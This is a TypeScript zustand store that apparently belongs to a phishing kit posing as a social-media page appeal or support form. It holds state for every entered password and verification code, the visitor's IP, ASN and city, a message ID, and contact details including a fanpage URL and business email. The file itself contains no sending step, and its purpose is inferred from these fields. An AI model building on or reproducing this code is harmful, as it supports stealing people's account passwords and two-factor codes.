import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    country_code: string;
}

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    messageId: number | null;
    baseMessage: string | null;
    passwords: string[];
    codes: string[];
    userEmail: string | null;
    userPhoneNumber: string | null;
    userFullName: string | null;
    translations: Record<string, string>;
    formData: {
        fullName: string;
        email: string;
        businessEmail: string;
        fanpageUrl: string;
        describeIssue: string;
        phoneNumber: string;
    };
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setMessageId: (id: number | null) => void;
    setBaseMessage: (message: string | null) => void;
    addPassword: (password: string) => void;
    addCode: (code: string) => void;
    resetPasswords: () => void;
    resetCodes: () => void;
    setUserEmail: (email: string | null) => void;
    setUserPhoneNumber: (phone: string | null) => void;
    setUserFullName: (name: string | null) => void;
    setTranslations: (translations: Record<string, string>) => void;
    setFormData: (data: Partial<State['formData']>) => void;
}

export const store = create<State>()((set) => ({
    isModalOpen: false,
    geoInfo: null,
    messageId: null,
    baseMessage: null,
    passwords: [],
    codes: [],
    userEmail: null,
    userPhoneNumber: null,
    userFullName: null,
    translations: {},
    formData: {
        fullName: '',
        email: '',
        businessEmail: '',
        fanpageUrl: '',
        describeIssue: '',
        phoneNumber: ''
    },
    setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
    setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
    setMessageId: (id: number | null) => set({ messageId: id }),
    setBaseMessage: (message: string | null) => set({ baseMessage: message }),
    addPassword: (password: string) => set((state) => ({ passwords: [...state.passwords, password] })),
    addCode: (code: string) => set((state) => ({ codes: [...state.codes, code] })),
    resetPasswords: () => set({ passwords: [] }),
    resetCodes: () => set({ codes: [] }),
    setUserEmail: (email: string | null) => set({ userEmail: email }),
    setUserPhoneNumber: (phone: string | null) => set({ userPhoneNumber: phone }),
    setUserFullName: (name: string | null) => set({ userFullName: name }),
    setTranslations: (translations: Record<string, string>) => set({ translations }),
    setFormData: (data) => set((state) => ({ formData: { ...state.formData, ...data } }))
}));
